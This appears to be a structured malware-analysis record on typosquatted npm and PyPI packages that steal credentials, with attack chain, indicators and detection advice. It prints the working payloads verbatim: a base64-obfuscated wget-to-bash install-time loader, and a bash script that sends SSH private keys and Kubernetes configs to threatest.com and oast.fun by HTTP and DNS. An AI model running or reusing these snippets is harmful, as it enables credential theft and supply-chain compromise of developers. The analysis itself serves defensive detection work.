package_info.package_versions: All versions published between September 12 and September 24, 2023
package_info.why_malicious: These packages are explicitly crafted to steal sensitive developer and system credentials, including SSH private keys and Kubernetes configuration files, by executing malicious code automatically during installation or import. They impersonate legitimate packages through typosquatting, use obfuscation and evolving payload delivery techniques to evade detection, and exfiltrate stolen data to attacker-controlled infrastructure.

malicious_snippets.code_snippet:
shell = b'wget -qO - https://down.threatest.com/uploads/install.sh | bash'
encoded = base64.b64encode(shell)
os.system('echo %s|base64 -d|bash' % encoded)
malicious_snippets.code_behavior: At install-time, the code base64-encodes a shell command that downloads and executes a remote bash script from down.threatest.com, resulting in the retrieval and execution of further malicious payloads and enabling the exfiltration of sensitive data.

malice_analysis.why_suspicious: The code downloads and executes a remote script from an untrusted domain during installation, using base64 encoding to obfuscate the payload and evade static analysis.
malice_analysis.violated_expectations: Legitimate packages do not execute remote code or download scripts from external, untrusted sources during installation or import.
malice_analysis.similar_legitimate_use: Automated dependency installation or setup scripts that fetch resources from official, trusted repositories.
key_indicators: Base64 encoding and decoding of shell commands
os.system call to execute decoded shell command

malicious_snippets.code_behavior: At install-time, the preinstall hook executes a Node.js command that downloads and runs a remote bash script from down.threatest.com, which initiates the collection and exfiltration of sensitive data.

malice_analysis.why_suspicious: Preinstall hooks that execute remote scripts from untrusted domains are highly suspicious and commonly used for malware delivery.
malice_analysis.violated_expectations: Legitimate packages do not run arbitrary remote code or download scripts from attacker-controlled domains during installation.
malice_analysis.similar_legitimate_use: Automated build or setup steps that fetch resources from trusted, official sources.
key_indicators: No user interaction required for execution

malicious_snippets.code_snippet:
#!/bin/bash
touch ConceptualTest.txt
tagDen="pip"
doma='cjq18vv2vtc000opszdggkb7ssayyyyd.oast.fun'
# DNS part
nslookup "$(uname).$tagDen.H.$doma"
nslookup "$(hostname).$tagDen.N.$doma"
nslookup "$(whoami).$tagDen.R.$doma"
nslookup "$(pwd).$tagDen.P.$doma"
# HTTP request
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d "msg={
  \"Current_Time\":\"$(date +%Y-%m-%dT%H:%M:%S.%3NZ)\",
  \"Os_Version\":\"$(uname -a | base64 | tr -d '\n')\",
  \"Current_Path\":\"$(pwd)\",
  \"HostName\":\"$(hostname)\",
  \"UserName\":\"$(whoami)\",
  \"ID\":\"$(id | cut -d ' ' -f 1)\",
  \"External_ip\":\"$(curl -s ifconfig.me)\",
  \"Intranet_ip\":\"$(ifconfig | grep -m 1 inet | awk '{print $2}')\",
  \"tagDen\":\"$tagDen\",
  \"SSH_Private_Key\":\"$(cat $HOME/.ssh/id_rsa | base64)\",
  \"Kubernetes_Config\":\"$(cat $HOME/.kube/config | base64)\"
}" https://app.threatest.com/report/
malicious_snippets.code_behavior: At runtime, the script collects system, user, and network information, including SSH private keys and Kubernetes configuration files, then exfiltrates this data via DNS queries and HTTP POST requests to attacker-controlled domains.

malice_analysis.why_suspicious: The script accesses and exfiltrates highly sensitive files such as SSH private keys and Kubernetes configs, and transmits system and user information to external attacker infrastructure.
malice_analysis.violated_expectations: Legitimate install scripts do not access or transmit private credentials, configuration files, or detailed system information to external servers.
malice_analysis.similar_legitimate_use: Internal diagnostic scripts for IT or security teams, but never in public or third-party packages.
key_indicators: Access and base64 encoding of ~/.ssh/id_rsa and ~/.kube/config
Exfiltration of data via HTTP POST to app.threatest.com
DNS queries embedding system/user info to *.oast.fun
Creation of ConceptualTest.txt as an execution marker

attack_chain.action: User installs a malicious package (npm or PyPI), often as a result of typosquatting on popular package names.
attack_chain.leads_to: Triggers automatic execution of malicious code during installation.

attack_chain.action: Malicious code executes during install/import (via preinstall/postinstall hooks or import-time code), initiating the download of a remote payload.
attack_chain.leads_to: Downloads and executes a remote bash script from attacker infrastructure.

attack_chain.action: The downloaded bash script collects sensitive data (system information, SSH keys, Kubernetes configs) and exfiltrates it to attacker-controlled servers via DNS and HTTP.
attack_chain.leads_to: Attacker receives credentials and system data, enabling further compromise or lateral movement.

behavioral_signatures: Execution of remote scripts from untrusted domains during install/import
Access and base64 encoding of ~/.ssh/id_rsa and ~/.kube/config
Exfiltration of sensitive files and system information via HTTP POST and DNS queries
Use of preinstall/postinstall hooks to invoke network utilities (wget, curl)
Automatic execution of obfuscated shell commands in setup.py or package.json
file_indicators: Presence of install.sh or similarly named scripts downloaded from external domains
References to ~/.ssh/id_rsa and ~/.kube/config in package scripts
Creation of ConceptualTest.txt file during installation
Base64-encoded shell commands embedded in setup.py or package.json scripts
network_indicators: Outbound connections to down.threatest.com, app.threatest.com, and *.oast.fun domains
DNS queries containing system or user information in subdomains to *.oast.fun
HTTP POST requests to https://app.threatest.com/report/ during or immediately after installation
detection_knowledge.how_to_detect: Monitor for packages that execute remote scripts or access sensitive files such as ~/.ssh/id_rsa and ~/.kube/config during install/import. Flag any package that references attacker-controlled domains (e.g., threatest.com, oast.fun) or makes network requests to these endpoints. Detect base64-encoded shell commands and the use of preinstall/postinstall hooks invoking network utilities (wget, curl). Watch for creation of files like ConceptualTest.txt and outbound DNS/HTTP traffic containing encoded system or user data.
